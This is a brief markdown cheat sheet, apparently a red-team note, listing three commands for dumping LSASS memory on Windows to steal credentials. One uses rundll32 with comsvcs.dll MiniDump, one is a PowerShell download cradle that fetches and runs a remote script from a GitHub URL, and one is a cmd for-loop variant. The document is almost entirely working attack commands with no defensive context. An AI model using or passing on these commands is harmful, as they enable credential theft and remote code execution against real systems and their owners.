---
title: lsass dumping techniques
author: i4
date: M11-02-2022
---
# Different SSL Dumping techniques

## COMSVCs 

```
rundll32.exe comsvcs.dll, MiniDump (Get-Process lsass).Id Temp\<NAME>.dmp full;Wait-Process -Id (Get-Process rundll32).id
```


## Run directly in memory
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/sp00ks-git/PowerShell-Stuff/main/lsass-dump')
```

## With a for loop
```
for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump ^%B lsass.dmp full
```

